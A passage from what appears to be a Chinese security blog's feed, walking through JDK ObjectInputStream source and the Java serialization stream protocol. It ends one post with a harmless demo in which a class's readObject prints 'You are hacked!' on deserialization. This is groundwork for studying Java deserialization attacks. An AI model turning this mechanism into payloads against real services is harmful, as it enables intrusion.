&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果serialFilter非空，那么调用序列化筛选器，这个筛选器调用了<code>serialFilter.checkInput</code>方法检查序列化数据，如果检测出来了异常，那么会令<code>status</code>为<code>Status.REJECTED</code>状态，<code>filterCheck</code>将会根据<code>serialFilter.checkInput</code>的检查结果来决定是否执行反序列化，如果<code>checkInput()</code>方法返回<code>Status.REJECTED</code>，反序列化将会被阻止，并抛出<code>InvalidClassException()</code>错误：</p></blockquote><p>如果checkInput()方法返回<code>Status.ALLOWED</code>，说明程序允许反序列化。</p><p>回到上一个流程，该轮到：<code>skipCustomData();</code>方法：</p><p>在结束了反序列化内容检测后，会调用<code>skipCustomData</code>方法跳过所有数据块和对象，直到遇到<code>TC_ENDBLOCKDATA</code>标识：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Skips over all block data and objects until TC_ENDBLOCKDATA is</span></span><br><span class="line"><span class="comment"> * encountered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">skipCustomData</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> oldHandle = passHandle;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.getBlockDataMode()) &#123;</span><br><span class="line">            bin.skipBlockData();</span><br><span class="line">            bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (bin.peekByte()) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                bin.readByte();</span><br><span class="line">                passHandle = oldHandle;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                readObject0(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来回到主线：<code>readNonProxyDesc</code>函数</p><p>该来到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    totalObjectRefs++;</span><br><span class="line">    depth++;</span><br><span class="line">    desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>)); <span class="comment">// 1</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    depth--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handles.finish(descHandle);<span class="comment">//2</span></span><br><span class="line">passHandle = descHandle;</span><br></pre></td></tr></table></figure><p>这里首先调用<code>ObjectStreamClass</code>中的<code>initNonProxy</code>方法，在这个方法里会初始化表示非代理类的类描述符。</p><p>接下来会调用调用<code>handles</code>的<code>finish</code>方法完成引用<code>Handle</code>的赋值操作</p><p>最后将结果赋值给<code>passHandle</code>成员属性（初始定义为<code>private int passHandle = NULL_HANDLE;</code>）</p><p>到这里，<code>readNonProxyDesc</code>结束</p><p>将得到的desc类描述信息赋值给<code>descriptor</code>变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readNonProxyDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line"><span class="keyword">int</span> descHandle = handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">passHandle = NULL_HANDLE;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">readClassDesc&#123;</span><br><span class="line"><span class="keyword">case</span> TC_CLASSDESC:<span class="type"></span></span><br><span class="line"><span class="type">            descriptor </span>= readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:<span class="type"></span></span><br><span class="line"><span class="type">            throw new StreamCorruptedException</span>(</span><br><span class="line">                <span class="keyword">String</span>.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后将<code>descriptor</code>作为结果返回给<code>readOrdinaryObject</code>方法，赋值给desc；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">  desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">  Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>到目前为止，我们拿到了类描述符号desc，继续走readOrdinaryObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 拿到类描述符</span></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">  <span class="comment">//检查是否可以反序列化</span></span><br><span class="line">    desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl == String<span class="class">.<span class="keyword">class</span> || <span class="title">cl</span> </span>== Class<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">            || <span class="title">cl</span> </span>== ObjectStreamClass<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">  <span class="comment">//判断有无异常信息</span></span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//读取序列化数据，给字段赋值</span></span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 处理handles的赋值</span></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        Object rep = desc.invokeReadResolve(obj);</span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// Filter the replacement object</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h3><p>这里才是真正的开始序列化对象的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//从父类开始</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                SerialCallbackContext oldContext = curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                  <span class="comment">// 如果有readObject方法,执行</span></span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * In most cases, the handle table has already</span></span><br><span class="line"><span class="comment">                     * propagated a CNFException to passHandle at this</span></span><br><span class="line"><span class="comment">                     * point; this mark call is included to address cases</span></span><br><span class="line"><span class="comment">                     * where the custom readObject method has cons'ed and</span></span><br><span class="line"><span class="comment">                     * thrown a new CNFException of its own.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    handles.markException(passHandle, ex);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            curContext.setUsed();</span><br><span class="line">                            <span class="keyword">if</span> (oldContext!= <span class="keyword">null</span>)</span><br><span class="line">                                oldContext.check();</span><br><span class="line">                            curContext = oldContext;</span><br><span class="line">                            reset = <span class="keyword">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ThreadDeath x) &#123;</span><br><span class="line">                            t = x;  <span class="comment">// defer until reset is true</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (!reset);</span><br><span class="line">                    <span class="keyword">if</span> (t != <span class="keyword">null</span>)</span><br><span class="line">                        <span class="keyword">throw</span> t;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * defaultDataEnd may have been set indirectly by custom</span></span><br><span class="line"><span class="comment">                 * readObject() method when calling defaultReadObject() or</span></span><br><span class="line"><span class="comment">                 * readFields(); clear it to restore normal read behavior.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                defaultDataEnd = <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 如果没有的话就执行默认的反序列化，给字段赋值</span></span><br><span class="line">                defaultReadFields(obj, slotDesc);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line">                skipCustomData();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                handles.lookupException(passHandle) == <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>执行结束之后就会返回一个对象obj，这个类就是序列化好的对象</p><p>回到<code>readObject</code>方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210717150734443.png" alt="image-20210717150734443" style="zoom:50%;"><p>在反序列执行完成过后，它会调用<code>vlist</code>成员的<code>doCallbacks</code>来执行完成过后的回调逻辑，然后结束所有的序列化流程。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>还是Student那个例子我们插入一个readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"You are hacked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"10range.ser"</span>));</span><br><span class="line">        Student o = (Student)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210717152451921.png" alt="image-20210717152451921" style="zoom:50%;"><p>也就是说，我们需要反序列化出来的对象是Student，正好我们本地有，又因为有readObject方法，于是就直接从当前流中取出对象，执行了这个方法。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>步骤</p><ul><li>首先拿到desc</li><li>如果有readObject方法，用反射执行</li><li>没有的话给对象字段赋值</li><li>序列化对象成功</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;梳理Java反序列化流程。&lt;/p&gt;
&lt;p&gt;参考&lt;a href=&quot;https://www.cnpanda.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;panda&lt;/a&gt;师傅。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://fynch3r.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java对象序列化流协议梳理</title>
    <link href="https://fynch3r.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/"/>
    <id>https://fynch3r.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-16T07:27:51.000Z</published>
    <updated>2021-07-17T07:38:31.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>协议原文<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">Object Serialization Stream Protocol</a></p><a id="more"></a><h1 id="stream流元素"><a href="#stream流元素" class="headerlink" title="stream流元素"></a>stream流元素</h1><p>stream，流元素，就是用来表示流中的对象。</p><p>现在在我们流中的每一个对象都需要表示，比如对象的类和类中的field字段。</p><p>流中对象的表示可以用语法来描述:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> objects</span><br><span class="line">new objects</span><br><span class="line">classes</span><br><span class="line"><span class="built_in">array</span>s</span><br><span class="line"><span class="built_in">string</span>s</span><br><span class="line">handles (句柄，流中对象的方向引用)</span><br><span class="line">这个句柄从 <span class="number">0x7E0000</span> 开始按顺序分配句柄。当流重置时，句柄在 <span class="number">0x7E0000</span> 处重新启动。</span><br></pre></td></tr></table></figure><p>stream中对象基本结构：</p><p><strong>类对象由的<code>ObjectStreamClass</code>对象表示</strong></p><p>非动态代理类对象的<code>ObjectStreamClass</code>由以下成分组成：</p><ul><li>兼容类的流唯一标识符 (SUID)</li><li>一组指示类的各种属性的标志，例如该类是否定义了<code>writeObject</code>方法，以及该类是否可序列化、可外部化或枚举类型</li><li>可序列化字段的个数</li><li>默认情况下，对于类的字段数组和对象字段来说，字段的类型要作为字符串被包含，字段描述符格式<code>Ljava/lang/Object;</code></li><li>由<code>annotateClass</code>方法写入的可选数据块</li><li>该对象父类的<code>ObjectStreamClass</code> ，如果父类不可序列化，该字段则为null</li></ul><p>动态代理类对象的<code>ObjectStreamClass</code>由以下成分组成：</p><ul><li>动态代理类实现的接口数量</li><li>动态代理类实现的所有接口名称，这些借口通过调用Class的<code>getINterfaces</code>方法的返回结果进行排序列出</li><li>由<code>annotateProxyClass</code> 方法写入的可选块数据记录或对象</li><li>父类对应的<code>ObjectStreamClass</code>和<code>java.lang.reflect.Proxy</code></li></ul><p>数组对象由以下成分组成：</p><ul><li>他们的 <code>ObjectStreamClass</code>对象。</li><li>元素的数量。</li><li>值的序列。值的类型在数组的类型中是隐式的。例如，字节数组的值是byte类型。</li></ul><p>Enum枚举类型:</p><ul><li>常量的基本枚举类型的<code>ObjectStreamClass</code>对象。</li><li>常量的名称字符串。</li></ul><p>流中的新对象<code>new Objects</code>由以下成组成：</p><ul><li><p>所有对象类的派生类信息</p></li><li><p>对象的每一个可序列化类的数据，从最上面的父类开始写入。</p><p>对于每个类，流包含以下内容：</p><ul><li>可序列化字段：</li><li>如果类有<code>writeObject/readObject</code>方法，那么有可能出现通过<code>writeObject</code>方法写入的可选对象或者基础类型的数据块<code>Data-Block</code>，跟着使用<code>endDataBlock方法</code></li></ul></li></ul><p>备注：</p><p>所有由类写入的原始数据都被缓冲并包裹在块数据记录中，无论数据是在writeObject方法中写入流中，还是在writeObject方法之外直接写入流中。<strong>这些数据只能被相应的readObject方法读取或直接从流中读取。</strong>由writeObject方法写入的对象会终止之前的任何块数据记录，并根据情况被写成普通对象或空或反向引用。块数据记录允许错误恢复以丢弃任何可选数据。</p><p>当从一个类中调用时，流可以丢弃任何数据或对象，直到遇到endBlockData。</p><h1 id="序列化流格式"><a href="#序列化流格式" class="headerlink" title="序列化流格式"></a>序列化流格式</h1><p>现在我们可以在对象流中随便抓一个stream。自顶向下解析它。</p><h2 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stream:</span><br><span class="line">magic version contents</span><br></pre></td></tr></table></figure><p>每个stream对象都是由三部分组成：</p><ul><li>magic : 魔数 <code>STREAM_MAGIC</code> 常量类型 表示内容类型</li><li>version：jdk版本号 <code>STREAM_VERSION</code> 常量类型</li><li>contents ：流对象内容</li></ul><p><code>STREAM_MAGIC</code>与<code>STREAM_VERSION</code>等常量值都在ObjectStreamConstants接口中定义。</p><h2 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contents:</span><br><span class="line">  content</span><br><span class="line">  contents content</span><br></pre></td></tr></table></figure><p>类似CFL，流中contents可以由一个content组成，也可以由多个contents组成</p><h2 id="content"><a href="#content" class="headerlink" title="content"></a>content</h2><p>这里以一个content为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content:</span><br><span class="line">  object</span><br><span class="line">  blockdata</span><br></pre></td></tr></table></figure><p>一个content可以是一个对象(object)，也可以是一个块数据(blockdata)。block在下面会详细说。</p><h2 id="object"><a href="#object" class="headerlink" 